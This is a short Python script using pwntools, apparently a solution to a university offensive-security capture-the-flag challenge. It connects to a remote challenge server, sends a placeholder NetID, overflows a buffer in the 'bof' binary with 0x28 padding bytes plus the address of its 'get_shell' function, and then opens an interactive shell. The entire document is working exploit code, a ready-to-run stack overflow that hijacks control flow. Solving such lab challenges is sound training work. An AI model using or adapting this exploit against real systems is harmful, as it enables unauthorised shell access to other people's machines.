from pwn import *

def run_exploit():
    connection = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1280)
    connection.recvuntil(b'NetID (something like abc123): ')
    connection.sendline(b'<NET ID>')

    binary = ELF("./bof")
    connection.recvuntil(b"?\n")

    exploit_payload = b'X' * 0x28 + p64(binary.symbols['get_shell'])
    connection.sendline(exploit_payload)

    connection.interactive()

if __name__ == "__main__":
    run_exploit()
